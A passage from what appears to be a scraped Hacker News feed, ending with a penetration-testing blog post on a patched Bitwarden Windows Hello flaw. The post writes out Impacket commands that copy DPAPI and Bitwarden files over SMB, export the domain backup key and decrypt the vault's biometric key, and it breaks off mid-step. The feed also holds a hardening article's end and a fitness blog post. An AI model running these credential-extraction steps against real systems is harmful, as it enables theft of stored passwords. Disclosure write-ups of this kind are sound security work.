<p>But if you need to run graphical programs, this becomes tricky. Using <code>ssh -Y</code> gives the remote program a full access to your display server, which has access to everything else running, not great...  You could still rely on <code>ssh -X</code> which enables X11 Security extensions, but you have to trust the implementation, and it comes with issues like no shared clipboard, poor performance and programs crashing when attempting to access a legit resource that is blocked by the security protocol...
</p>
<p>In my opinion, the best way to achieve isolation for graphical programs would be to run a dedicated VNC server in the local user, and connect from your own user.  This should be better than running on your own X locally.
</p>
<h2 id="_Encrypted_home_with_USB_unlocking">10.3. Encrypted home with USB unlocking <a href="#_Encrypted_home_with_USB_unlocking">§</a></h2>
<p>In a setup where the computer is used by multiple person, the system encryption may be tedious because everyone have to remember the main passphrase, you have no guarantee one won't write it down on a post-it... In that case, it may be better to have a personal volume, encrypted, for each user.
</p>
<p>I don't have an implementation yet, but I got a nice idea.  Adding a volume for a user would look like the following:
</p>
<ul>

  <li>take a dedicated USB memory stick for this user, this will be used as a "key" to unlock their data directory</li>
  <li>overwrite the memory stick with random data</li>
  <li>create an empty disk file on the system, it will contain the encrypted virtual disk, use a random part of the USB disk for the passphrase (you will have to write down the length + offset)</li>
  <li>write a rc file that looks for the USB disk volume if present, if so, tries to unlock and mount the partition upon boot</li>
</ul>

<p>This way, you only need to have your USB memory stick plugged in when the system is booting, and it should automatically unlock and mount your personal encrypted volume.  Note that if you want to switch user, you would have to reboot to unlock their drive if  you don't want to mess with the command line.
</p>
<h2 id="_Conclusion">11. Conclusion <a href="#_Conclusion">§</a></h2>
<p>It's always possible to harden a system more and more, but the balance between real world security and actual usability should always be studied.
</p>
<p>No one will use a too-much hardened system if they can't work on it efficiently, on the other handle, users expect their system to protect them against most common threats.
</p>
<p>Depending on one's environment and threat model, it's important to configure their system accordingly.
</p>

</article>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reasons to grow and keep big muscles (114 pts)]]></title>
            <link>https://todaypurpose.com/posts/big-muscles/</link>
            <guid>38853118</guid>
            <pubDate>Wed, 03 Jan 2024 12:03:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://todaypurpose.com/posts/big-muscles/">https://todaypurpose.com/posts/big-muscles/</a>, See on <a href="https://news.ycombinator.com/item?id=38853118">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><time datetime="2023-12-28T13:37:59+0800">Dec 28, 2023</time></p><p>Life isn’t just about how long we live; it’s about how well we live it. We often hear about increasing our lifespan, but is a longer life worth it if we can’t move and become dependent on others? What’s equally, or even more important, is enhancing our healthspan—the period during which we enjoy a good quality of life. From what I’ve observed when talking to older people, they care more about “improving the quality of their life” than “living a longer life”</p><p>Imagine being unable to engage in activities you love, like traveling, playing with kids, hiking, or even just gardening. The loss of functional ability can lead to a diminished the enjoyment we have in life.</p><p>What can you do to maintain your independence, relationships, and <strong>dignity</strong>? I believe the answer lies in working out, especially <strong>resistance training</strong> that helps keeping our strength. In his book <a href="https://peterattiamd.com/outlive/">“Outlive”</a>, Peter Attia shows how we can increase our healthpan and combat the effect of aging :</p><p><img src="https://todaypurpose.com/img/working-out/increase-healthspan-quality-of-life.jpg" alt="Health Decline Graphic"></p><blockquote><p>“Exercise is by far the most potent longevity ‘drug’ available.” It’s not just about delaying death; it’s about preserving cognitive and physical abilities.</p></blockquote><h2 id="the-inevitable-decline-begins-in-your-30s">The inevitable decline begins in your 30s</h2><p>Many of us don’t notice it in our 20s, but as we enter our 30s, the signs become more and more reccurent. Recovery from injuries slows down, we get tired more quickly, and our overall vigor starts to wane.</p><h3 id="sarcopenia-losing-muscle-and-strength-as-we-age">sarcopenia: losing muscle and strength as we age</h3><p>Sarcopenia is the loss of muscle strength with age. It often catches people off guard and people realize it when it’s too late. Starting as early as age 30, we begin to lose 3% to 5% of our muscle mass each decade. By the end of a typical lifespan, most individuals have lost about 30% of their muscle strength.
Preserving muscle mass is crucial. <strong>No amount of cardio</strong> (running, cycling) can combat this natural decline. Both men and women need to engage in strength training along with cardiovascular exercise.</p><p><img src="https://todaypurpose.com/img/working-out/muscle-strengtht-loss.webp" alt="Muscle Loss Over Time"></p><p>Look at the similarities in thigh muscle of the triathletes and someone who does not move below (<a href="https://twitter.com/ChamberofFit/status/1688607251316056065">source</a>):</p><p><img src="https://pbs.twimg.com/media/F28jWCFWwAAWJbn?format=jpg" alt="Comaparison triathlete sedetanire"></p><h2 id="resistance-training-the-ultimate-drug-to-improve-healthspan">Resistance Training: The ultimate drug to improve healthspan</h2><p>The graph show than our peak strength happen at 30 and start decreasing over time:</p><p><img src="https://todaypurpose.com/img/working-out/peak-strenght.jpeg" alt="Peak strength"></p><p>This other graph show the effect of resistance training, and how it can prevent disability:</p><p><img src="https://todaypurpose.com/img/working-out/resistance-training-effect.png" alt="Effect of Exercises Over Time"></p><p>Without resistance training, our bodies undergo a transformation post-30: muscle loss gives way to a higher fat percentage, leading to a weaker physique and the lose of autonomy.</p><h3 id="reducing-the-risk-of-injuries-and-falls">reducing the risk of injuries and falls</h3><p>Falls are a leading cause of mortality for people over 75. Resistance training enhances lower body strength, crucial for activities like climbing stairs or simply standing up from a chair. Stronger muscles also mean better balance and a reduced risk of falls, which can be catastrophic in later life. Starting 60-65: risk of falls that lead to immediate death or within 12 months (break hips / femur) is really high (15-30% depending the study). <a href="https://www.cdc.gov/falls/data/">Over 14 million, or 1 in 4 older adults report falling every year</a>. It is also the leading cause on the non-fatal injuries in the USA at all ages :</p><p><img src="https://todaypurpose.com/img/working-out/fall-leading-cause-hospitals.png" alt="Fall hospitals"></p><h3 id="a-20-year-advantage">a 20-year advantage</h3><p><a href="https://www.nsca.com/contentassets/2a4112fb355a4a48853bbafbe070fb8e/resistance_training_for_older_adults__position.1.pdf">Research</a> shows that 85-year-old individuals who have consistently engaged in weightlifting display similar physical power to non-lifting 65-year-olds. Long-term resistance training can grant an approximate 20-year advantage in physical capabilities.</p><h3 id="avoiding-pains">avoiding pains</h3><p>If you are in your 30s like me, you probably already feel it. Regular exercise, especially strength training, plays a vital role in pain prevention and management. Weak muscles and a sedentary lifestyle often lead to chronic pain issues, which can severely impact the quality of life in our later years.</p><h2 id="other-reasons-to-stay-strong-as-we-age">Other reasons to stay strong as we age?</h2><h3 id="cognitive-benefits-mood-stamina">cognitive benefits, mood, stamina</h3><p>Resistance training doesn’t just benefit the body; it also supports cognitive health. Low muscle mass and physical inactivity are linked to cognitive decline in old age. Exercise releases myokines, which support brain health, indicating a dose-dependent effect between muscle mass and cognitive function.</p><p>It also boost mood and reduce symptoms of anxiety and depression. When pushing hard, your body release endorphins and other mood-enhancing chemicals during exercise. These natural mood lifters contribute to a sense of well-being you can get each time you go for a workout.</p><p>Beyond building muscle strength, resistance training enhances overall stamina and endurance. This increased stamina is not just physical; it translates into greater mental and emotional resilience. Older adults with higher levels of fitness and stamina are better equipped to handle the challenges of daily life, remain independent, and engage in social activities, which are crucial for mental health and quality of life.</p><h3 id="being-in-control">being in control</h3><p>Resistance training is the art of pushing yourself than what you think is your limit. It teaches the value of persistence, discipline, and hard work. The satisfaction of achieving a physical goal through resistance training, and in my humble opinion, can <strong>boost confidence</strong> in one’s ability to <strong>overcome other challenges in life</strong> you might think are not possible to overcome.</p><p>Alan Thrall (that I started following because his excellent <a href="https://www.youtube.com/watch?v=UFs6E3Ti1jg">“how to squat video”</a>) puts it really well. Why did he kept working out during a crazy time such has the first weeks of having a baby and he his overwhelmed?</p><blockquote><p>When times get tough, I need keeps everyone (his household) grounded, and helps people moving to the right direction. Stay 1 step ahead of everything, and not only being pushed around by life circumstances. I need to be stronger than the situation.</p></blockquote><iframe width="560" height="315" src="https://www.youtube.com/embed/NQlHBvg6Cgw?si=wsx7Pvh-gDhkrXCP&amp;start=516" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen=""></iframe><h3 id="independance-autonomy">independance, autonomy</h3><p>As we lost strength we will lose ability to grab things, or even walk. This might lead to Keeping some dignity as a human being.
The ability to engage in activities like playing with kids, hiking, or traveling is not just a matter of physical capability; it’s also about maintaining independence and relationships, which are central to happiness. As we age, the desire to remain self-reliant grows stronger, and resistance training plays a crucial role in this.</p><h3 id="keeping-relationships">keeping relationships</h3><p>Strength directly influences our ability to maintain social connections. If our mobility decreases, so does the ability to visit friends and family, which can lead to isolation and loneliness.</p><p>Staying strong and mobile enables us to actively participate in social activities, maintaining and nurturing relationships that are essential for mental and emotional well-being.</p><p>Staying healthy is probably the best gift we can give to our children. As we become more dependent due to health issues, we not only incur significant healthcare costs but also potentially place a financial and emotional burden on our families.</p><h3 id="reducing-risk-of-cancer-and-heart-disease">reducing risk of cancer and heart disease:</h3><p>Resistance training can lead from <strong>10 to 20 percent reduction</strong> in the risk of early death from all causes and from cancer and heart disease. <a href="https://bjsm.bmj.com/content/56/13/755">https://bjsm.bmj.com/content/56/13/755</a></p><h3 id="staying-fit-by-doing-nothing">staying fit by doing “nothing”</h3><p>Friends usually ask me how I can stay fit by eating that much I believe I have and advantage I’ve been building since I was 10ish: I kept working out. I’ve built muscle over the years, and my <strong>resting metabolic rate</strong> . Lean muscle burns more calories than fat, even at rest. Having more muscle is a kind of cheat code. By increasing muscle mass your resting metabolic rate goes up. It means that <a href="https://todaypurpose.com/posts/big-muscles/(https://www.researchgate.net/figure/Relationship-between-BMR-and-lean-body-mass_fig1_5440088)">you can burn more calories when you are at rest</a>:</p><p><img src="https://todaypurpose.com/img/working-out/resting-metabolic-rate-vs-lean-muscle.png" alt="resting metabolic rate vs muscle"></p><p>Of course you’ll need to preserve those muscle with resistance training.</p><h2 id="some-last-words">Some last words</h2><p>Resistance training is a choice you make. It’s hard, but only has upsides for your current and future self. It is never too late to start. The benefits of starting it can be seen at any age. The key is to keep doing it, no matter what.</p><p>My only advices:</p><ul><li>Find good lasting reasons to workout (I hope this article helped) and stop finding excuses to not go.</li><li>If you’re over 30 (or even in your 20s and able to afford it), hire a personal trainer to start. They can check your form and avoid any kind of injuries. With weights, it is really easy to get a bad form, no matter how many youtube videos you watch. I went to see a Physiotherapist 4 years after I started squats, and this is the best thing I’ve ever done. She retaught me everything I think I knew about squatting.</li><li>I also do a bit of aerobic exercices (cardio). But excessive cardio is counterproductive, leading to loss of muscle mass and potential joint issues.</li><li>The CDC recommends <a href="https://www.cdc.gov/physicalactivity/basics/age-chart.html">2+ days per week that work all major muscle groups (legs, hips, back, abdomen, chest, shoulders, and arms)</a>.</li><li>For very beginner, I do recommend the <a href="https://stronglifts.com/5x5/">5x5 program</a>. The program work on all biggest muscles of your bodies. I do also like their app that is really easy to follow. There is plenty of strength training gurus out there. No matter what program you pick, you’ll find benefits any of them.</li><li>When you go to the gym, leave your ego at home, and never compare yourself to others. You’ll just get injured.</li></ul><hr><p>Liked this post ? You’ll love that one: <a href="https://todaypurpose.com/posts/time-money-health/">On Time, Money and Health</a></p><hr></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bitwarden Heist – How to Break into Password Vaults Without Using Passwords (188 pts)]]></title>
            <link>https://blog.redteam-pentesting.de/2024/bitwarden-heist/</link>
            <guid>38853058</guid>
            <pubDate>Wed, 03 Jan 2024 11:53:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/">https://blog.redteam-pentesting.de/2024/bitwarden-heist/</a>, See on <a href="https://news.ycombinator.com/item?id=38853058">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <h4>3 January 2024</h4>
    
    



    <p>Sometimes, making particular security design decisions can have unexpected
consequences. For security-critical software, such as password managers, this
can easily lead to catastrophic failure: In this blog post, we show how
<a href="https://bitwarden.com/">Bitwarden’s</a> Windows Hello implementation allowed us
to remotely steal all credentials from the vault without knowing the password
or requiring biometric authentication. When we discovered this during a
penetration test it was so unexpected for us that we agreed with our client to
publish a blog post about it and tell the story.</p>
<p><strong>The underlying issue has been corrected in Bitwarden v2023.4.0 in April 2023</strong>
(but the story is interesting nonetheless).</p>


<a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/banner_close.webp">
            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/banner_close_hu36683dd95a8014e4eb61d87ec949c2f1_125614_1200x0_resize_q100_bgffffff_box_2.jpg" alt="Windows Logo on blue shield in front of an open vault">
            </p>

            <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/banner_close.webp" alt="Windows Logo on blue shield in front of an open vault">
            </p>
        </a>
    

<h3 id="where-we-started">Where We Started</h3>
<p>We recently conducted a penetration test with the goal of compromising the
internal network of a client in a Windows environment. As usual, we managed to
get administrative access to the domain controller, however, there was an
additional hurdle: The backup server, one of the prioritized targets, did not
reside within the domain. Having already gained access to Domain Administrator
accounts, we decided to take a look around their Windows workstations in the
hopes of uncovering information that would grant us access to the backup
system. Looking at the workstations, we found that passwords seemed to be
stored using Bitwarden (the following details apply to Version <a href="https://github.com/bitwarden/clients/releases/tag/desktop-v2023.3.0">Desktop
v2023.3.0</a>
of the software). We made the assumption that credentials to the backup system
might be found in the Bitwarden vault of the employees in charge of the IT
infrastructure. After consulting with our client, we got the permission to
attempt to retrieve the contents of one of these vaults. Since we did not want
to potentially disrupt the client’s business by using invasive techniques such
as key loggers to obtain access to the backup system, we looked for an
unintrusive way without relying on end user interaction if possible.</p>
<p>We first tried to crack the vault using simple credential stuffing attacks,
however this remained unsuccessful, leading us to ultimately attempt a more
creative approach. To further analyze the vault, we decided to download
the main storage file of Bitwarden, in the hopes of finding anything of note. It
is located under the user’s home directory at
<code>%AppData%\Bitwarden\data.json</code>. Downloading the JSON file and opening it
in a text editor already revealed an unexpected finding:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span>		<span>"openAtLogin"</span><span>:</span> <span>false</span><span>,</span>
</span></span><span><span>		<span>"enableBiometrics"</span><span>:</span> <span>true</span><span>,</span>
</span></span><span><span>		<span>"biometricText"</span><span>:</span> <span>"unlockWithWindowsHello"</span><span>,</span>
</span></span><span><span>		<span>"noAutoPromptBiometricsText"</span><span>:</span> <span>"autoPromptWindowsHello"</span><span>,</span>
</span></span><span><span>		<span>"installedVersion"</span><span>:</span> <span>"2023.3.0"</span><span>,</span>
</span></span><span><span>        [<span>...</span>]
</span></span><span><span>			<span>"avatarColor"</span><span>:</span> <span>null</span><span>,</span>
</span></span><span><span>			<span>"biometricUnlock"</span><span>:</span> <span>true</span>
</span></span><span><span>		<span>},</span>
</span></span><span><span>		<span>"tokens"</span><span>:</span> {
</span></span></code></pre></div><p>It seemed that this Bitwarden vault could be opened using Biometrics, and
Windows Hello in particular. We had the feeling that it might be worth looking
at, so we decided to dig deeper.</p>
<h3 id="biometric-unlock---how-does-it-work">Biometric Unlock - How Does it Work?</h3>
<p>Even if biometrics are enabled, the vault still has a main password (Bitwarden
calls it <a href="https://bitwarden.com/help/master-password/">master password</a>), you
simply do not have to always enter it to unlock the vault. This begs the
question how the vault is secured if you do not have to enter the master
password. Well, the vault is not really encrypted with the master password, but
with an <em>account encryption key</em>, which is itself stored in encrypted form
within the vault. The key to decrypting the <em>account encryption key</em> is derived
from the <em>main password</em> chosen during vault creation.</p>
<p><em>In other words:</em> When a user enters their main password, Bitwarden derives a key
from the password and this key is then used to decrypt the actual <em>account
encryption key</em> which in turn can decrypt the credentials stored in the vault.</p>
<p>The key derived from the <em>main password</em> will be called <em>derived key</em> from now
on and it is exactly where the biometric unlock comes into play. At this point,
users can choose to add additional unlock mechanisms, which usually results in an
encrypted copy of the <em>derived key</em> being stored at a (hopefully) safe location
from which it can be retrieved using biometrics, for example. As a result,
whoever can retrieve and decrypt the <em>derived key</em> does not need a password to
access the vault.</p>
<p>The already described Biometric unlock is implemented based on Windows Hello on
Windows machines. Consequently, activating biometric login on Windows means that
the <em>derived key</em> is encrypted locally using a secret which can be retrieved
after authentication via Windows Hello. So far so good, but as it turns out, it
is very much worthwhile to take a closer look into how this is actually
implemented in Bitwarden.</p>
<p>After some digging, we found that Bitwarden stored the encrypted copy of the
<em>derived key</em> using the Windows Credentials API by calling
<a href="https://learn.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credwritew"><code>windows::win32::Credentials::CredWriteW</code></a>
in the <a href="https://github.com/bitwarden/clients/blob/7f25f5f6ecc47ae3354b60e6ba6158f8be185a8d/apps/desktop/desktop_native/src/password/windows.rs#L110">bitwarden/clients Rust
code</a>.
Unfortunately, the documentation on how these credentials are protected is
meager, to say the least, which makes it complicated to actually understand what
is happening when the API is used. It seems, as though <code>CredWriteW</code> creates
credentials using the <a href="https://stackoverflow.com/a/9228105">Credential Manager</a>,
which in turn seems to invoke the lower-level Data Protection API
(<a href="https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi">DPAPI</a>).
DPAPI provides a convenient way to <a href="https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata">store data
securely</a>
such that only the given user is able to retrieve the data at a later point in
time. The differences between protecting credentials via the Credential Manager
and DPAPI are somewhat unclear, however using the Credential Manager seems to
provide <a href="https://stackoverflow.com/a/9228105">additional benefits</a> over using
the low-level API, for example UI visibility (you can test this yourself by
searching for the <code>Credential Manager</code> application in you Windows Start menu).</p>
<p>So in order to decrypt the Bitwarden vault, we either need to know the main
password in order to derive the <em>derived key</em> on-the-fly or we need to retrieve
the <em>derived key</em> from the depths of the encrypted DPAPI storage. We knew that
DPAPI has a lot of ties to the Active Directory that are relevant for
domain-joined workstations and we had already compromised the client’s Active
Directory, so we chose the latter approach.</p>
<h3 id="robbing-the-vault-remotely---who-needs-a-master-password-anyway">Robbing the Vault Remotely - Who Needs a Master Password, Anyway?</h3>
<p>We soon learned about an <a href="https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi-backup-keys-on-ad-domain-controllers">awfully convenient
feature</a>
of DPAPI, or rather its newer version
<a href="https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi">DPAPI-NG</a> on
domain-joined workstations:</p>
<blockquote>
<p>Normally, domain users encrypt DPAPI-protected data using keys that are
derived from their own passwords. However, if the user forgets their password,
or if their password is administratively reset or reset from another device,
the previously encrypted data can no longer be decrypted using the new keys
derived from the user’s new password. When this occurs, the data can still be
decrypted using the Backup keys stored on the Active Directory domain
controllers. They can then be re-encrypted with the user’s new
password-derived key. This means that anyone who has the DPAPI Backup keys for
a domain will be able to decrypt DPAPI-encrypted data for any domain user,
even after the user’s password is changed.</p>
</blockquote>
<p>This means for one that the data is encrypted using the password of the domain
user and no direct involvement of Windows Hello is needed to decrypt it (as long
as the user’s password is known). Furthermore, the data can additionally be
decrypted with a <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/">remote backup
key</a>
stored on the domain controller. What could possibly go wrong?</p>
<p>Since the workstation running Bitwarden was domain-joined and the domain was
already compromised, we began hunting for DPAPI keys in order to exploit this
mechanism. First, we need to obtain whatever DPAPI stores on the machine itself.</p>
<p>We quickly found that two directories were of particular relevance to us:
<code>%AppData%\Microsoft\Protect</code>, which is used to securely store the <em>DPAPI
decryption keys</em>, and <code>%AppData%\Microsoft\Credentials</code>, where the <em>protected
data</em> resides. Note, that we use some simplifications involving the creation of
session keys in DPAPI since they are of no relevance to this blog post; details
are available <a href="https://learn.microsoft.com/en-us/previous-versions/ms995355(v%3Dmsdn.10)">here</a>.</p>
<p>If you open these directories in the Explorer, you won’t see anything because
they are hidden in a way that Explorer won’t even show them when “Show hidden
files” is enabled. However, the PowerShell command <code>Get-ChildItem</code> or <code>gci</code> can
display them when adding <code>--force</code> or <code>--hidden</code>. They are also visible via SMB
and as we already had remote administrator access we chose this path.</p>
<p>The following code snippets are taken from our lab environment, but are closely
based on the actual penetration test. First, we obtained the required Bitwarden
data file using <code>smbclient</code> from the <a href="https://github.com/fortra/impacket">Impacket
project</a>:</p>
<pre tabindex="0"><code>$ smbclient.py 'LAB/Administrator:&lt;password&gt;@workstation.lab'
Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright 2022 Fortra

Type help for list of commands
# use C$
# get \Users\user1\AppData\Roaming\Bitwarden\data.json
</code></pre><p>In the same session, we also downloaded the <code>Credentials</code> and <code>Protected</code> data:</p>
<pre tabindex="0"><code># cd \Users\user1\AppData\Roaming\Microsoft\Credentials\
# ls
drw-rw-rw-          0  Tue Nov 28 12:59:46 2023 .
drw-rw-rw-          0  Tue Nov 28 12:59:46 2023 ..
-rw-rw-rw-        686  Tue Nov 28 14:02:38 2023 C6530B1481D73604A6A51D114372F1AA
# get C6530B1481D73604A6A51D114372F1AA
# cd ..
# cd Protect
# ls
drw-rw-rw-          0  Mon Nov 27 09:59:01 2023 .
drw-rw-rw-          0  Mon Nov 27 09:59:01 2023 ..
-rw-rw-rw-         24  Mon Nov 27 09:58:51 2023 CREDHIST
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 S-1-5-21-505269936-2602674991-4082112561-1105
-rw-rw-rw-         76  Mon Nov 27 09:59:01 2023 SYNCHIST
# cd S-1-5-21-505269936-2602674991-4082112561-1105
# ls
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 .
drw-rw-rw-          0  Mon Nov 27 09:58:51 2023 ..
-rw-rw-rw-        740  Mon Nov 27 09:58:51 2023 14c8d0db-8c7c-4bf8-a857-eb20500a3893
-rw-rw-rw-        904  Mon Nov 27 09:58:51 2023 BK-LAB
-rw-rw-rw-         24  Mon Nov 27 09:58:51 2023 Preferred
# get 14c8d0db-8c7c-4bf8-a857-eb20500a3893
# exit
</code></pre><p>Downloading these files made it possible to work on the decryption process
locally, however it also meant that we did not gain access to the user’s main
decryption password directly. This is where the handy feature to decrypt DPAPI
decryption keys using backup keys comes into play, as we know that it is
possible to decrypt these local secrets with the backup key from the domain
controller. We could conveniently download it using the <code>dpapi.py</code> script from
the <a href="https://github.com/fortra/impacket">Impacket project</a>:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ dpapi.py backupkeys -t <span>'LAB/Administrator:&lt;password&gt;@dc.lab'</span> --export
</span></span></code></pre></div><p>In this case, we renamed the key to <code>backupkey.pvk</code>. Using this newly acquired
key, we could start by decrypting the protected DPAPI decryption key that we
took from the workstation:</p>
<!-- raw HTML omitted -->
<div><pre tabindex="0"><code data-lang="shell"><span><span>$ dpapi.py masterkey -pvk backupkey.pvk -file ./14c8d0db-8c7c-4bf8-a857-eb20500a3893
</span></span><span><span>Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright <span>2022</span> Fortra
</span></span><span><span>
</span></span><span><span><span>[</span>MASTERKEYFILE<span>]</span>
</span></span><span><span>Version     :        <span>2</span> <span>(</span>2<span>)</span>
</span></span><span><span>Guid        : 14c8d0db-8c7c-4bf8-a857-eb20500a3893
</span></span><span><span>Flags       :        <span>0</span> <span>(</span>0<span>)</span>
</span></span><span><span>Policy      :        <span>0</span> <span>(</span>0<span>)</span>
</span></span><span><span>MasterKeyLen: <span>00000088</span> <span>(</span>136<span>)</span>
</span></span><span><span>BackupKeyLen: <span>00000068</span> <span>(</span>104<span>)</span>
</span></span><span><span>CredHistLen : <span>00000000</span> <span>(</span>0<span>)</span>
</span></span><span><span>DomainKeyLen: <span>00000174</span> <span>(</span>372<span>)</span>
</span></span><span><span>
</span></span><span><span>Decrypted key with domain backup key provided
</span></span><span><span>Decrypted key: 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
</span></span></code></pre></div><p>It was now simply a matter of using this key to decrypt the Biometric login
credentials which are necessary to get into the Bitwarden vault:</p>
<!-- raw HTML omitted -->
<div><pre tabindex="0"><code data-lang="shell"><span><span>$ dpapi.py credential -f ./C6530B1481D73604A6A51D114372F1AA -key 0xad69553beafe0c5bcaf3b61a61136da64c50c57406f3649c6f70c11dc8d22a09d87241bd769ddbcb022a64744cbcd28342176593da30c825a0a56105496f0d5a
</span></span><span><span>Impacket v0.10.0.post1+20230417.105142.28de12f1 - Copyright <span>2022</span> Fortra
</span></span><span><span>
</span></span><span><span><span>[</span>CREDENTIAL<span>]</span>
</span></span><span><span>LastWritten : 2023-11-28 14:02:38
</span></span><span><span>Flags       : 0x00000030 <span>(</span>CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH<span>)</span>
</span></span><span><span>Persist     : 0x00000003 <span>(</span>CRED_PERSIST_ENTERPRISE<span>)</span>
</span></span><span><span>Type        : 0x00000001 <span>(</span>CRED_TYPE_GENERIC<span>)</span>
</span></span><span><span>Target      : LegacyGeneric:target<span>=</span>Bitwarden_biometric/ea0b6061-4381-4534-9e91-50cf98753530_masterkey_biometric
</span></span><span><span>Description :
</span></span><span><span>Unknown     :
</span></span><span><span>Username    : ea0b6061-4381-4534-9e91-50cf98753530_masterkey_biometric
</span></span><span><span>Unknown     : <span>"6PN6Y9wkXjrHvDCijM7fhkNrDL8PI/dc70m9XoSqxDE="</span>
</span></span></code></pre></div><p>This revealed the <em>biometric key</em> (a copy of the previously described <em>derived
key</em>), which grants access to the Bitwarden vault:
<code>6PN6Y9wkXjrHvDCijM7fhkNrDL8PI/dc70m9XoSqxDE=</code></p>
<p>This means that we don’t need the main password, we don’t need the fingerprint
for biometrics, we don’t even have to use a keylogger or dump Bitwarden’s
process memory. This also means that we don’t have to wrestle with endpoint
protection and we don’t need to wait for the actual user to unlock the vault. We
simply have to use DPAPI as it was designed. We seriously doubt any user is
aware of these implications when enabling Windows Hello for their vault.</p>
<p>So far we only have shown the <em>derived/biometric key</em>, which is sufficient to
decrypt the vault. In practice, however, there is still a little legwork we
have to do. After all, our goal was not to demonstrate that we <em>could</em> decrypt
the vault but to get actual credentials from the vault.</p>
<h3 id="breaking-into-the-vault">Breaking Into the Vault</h3>
<p>We first had to figure out how to decrypt the Bitwarden <em>account encryption
key</em>, which protects all other information in the vault. Credentials are not
always encrypted with the <em>account encryption key</em> directly since Bitwarden
also supports usage scenarios where some credentials should be shared in an
organization, for example. This is solved by adding additional layers of keys
(private and organizational keys), which are used to encrypt organization
credentials, and are also protected using the <em>account encryption key</em>. Take a
look at the figure below if you are starting to get confused about all the keys
involved in this story.</p>



    <a href="https://blog.redteam-pentesting.de/2024/bitwarden-heist/key-situation.svg">
        <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/key-situation.svg" alt="Overview of keys">
        </p>
        <p><img src="https://blog.redteam-pentesting.de/2024/bitwarden-heist/key-situation.svg" alt="Overview of keys">
        </p>
    </a>
    

<p>The decryption process therefore consists of three main steps: (1) Decryption
of the <em>account encryption key</em> using the <em>biometric key</em>, (2) decryption of the
second layer of keys using the <em>account encryption key</em> and (3) decryption of the
credentials using either the <em>account encryption key</em> or one of the intermediate
keys. We then set out to write a Python script to automate the decryption. Let’s
walk through each step:</p>
<ol>
<li>
<p>We started by extracting the user object from the Bitwarden data file
<code>data.json</code>. The user object contains the encrypted credentials (in the
<code>data</code> section) and the encryption keys (in the <code>keys</code> section), in addition
to (unencrypted) information about the user account like the email address
(<code>profile</code>), settings like the online vault URL (<code>settings</code>) and more. The
user section can be identified by searching for a UUID which is used as key
in the JSON object:</p>
<div><pre tabindex="0"><code data-lang="json"><span><span><span>"ea0b6061-4381-4534-9e91-50cf98753530"</span><span>:</span> {
</span></span><span><span>    <span>"data"</span>: {
</span></span><span><span>        <span>[...]</span>
</span></span><span><span>    <span>"keys"</span>: {
</span></span><span><span>        <span>"cryptoSymmetricKey"</span>: {
</span></span><span><span>            <span>"encrypted"</span>: <span>"2.Z9+7NUlzujEYKrRX+x22+A==|rB5YmxVMKo9tJtNSmRT8mpVQu7GEAHhKndJBXKBwWfW1rw6i3x003ZPligtJCmWXpdHIryF2fb5KdETAvr9QLws27A8z3ZAO4KNAgrzGH14=|PuD7z8am9+l09gM8SDFUU8hvFa02x30gYqJXe7Ac6mI="</span>
</span></span><span><span>        },
</span></span><span><span>        <span>[...]</span>
</span></span></code></pre></div><p>Since Bitwarden uses different types of encryption for different scenarios,
all encrypted values are stored using a particular format, which starts with
an <em>encryption type</em> identifier (<a href="https://github.com/bitwarden/clients/blob/master/libs/common/src/platform/enums/encryption-type.enum.ts">from
GitHub</a>):</p>
<div><pre tabindex="0"><code data-lang="rust"><span><span><span>export</span> <span>enum</span> <span>EncryptionType</span> {
</span></span><span><span>  <span>AesCbc256_B64</span> <span>=</span> <span>0</span>,
</span></span><span><span>  <span>AesCbc128_HmacSha256_B64</span> <span>=</span> <span>1</span>,
</span></span><span><span>  <span>AesCbc256_HmacSha256_B64</span> <span>=</span> <span>2</span>,
</span></span><span><span>  <span>Rsa2048_OaepSha256_B64</span> <span>=</span> <span>3</span>,
</span></span><span><span>  <span>Rsa2048_OaepSha1_B64</span> <span>=</span> <span>4</span>,
</span></span><span><span>  <span>Rsa2048_OaepSha256_HmacSha256_B64</span> <span>=</span> <span>5</span>,
</span></span><span><span>  <span>Rsa2048_OaepSha1_HmacSha256_B64</span> <span>=</span> <span>6</span>,
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>/** [...]
</span></span></span><span><span><span> * Example of annotated serialized EncStrings:
</span></span></span><span><span><span> * 0.iv|data
</span></span></span><span><span><span> * 1.iv|data|mac
</span></span></span><span><span><span> * 2.iv|data|mac
</span></span></span><span><span><span> * 3.data
</span></span></span><span><span><span> * 4.data
</span></span></span><span><span><span> [...]
</span></span></span></code></pre></div><p>As indicated by the leading 2, our account encryption key was encrypted
using AES-CBC-256, and integrity-protected using an HMAC based on SHA-256.
Before decrypting the account key with the biometric key, it has to be
expanded using <a href="https://en.wikipedia.org/wiki/HKDF">HKDF-expand</a>, though.</p>
</li>
<li>
<p>With the account encryption key, we were able to decrypt the second layer of
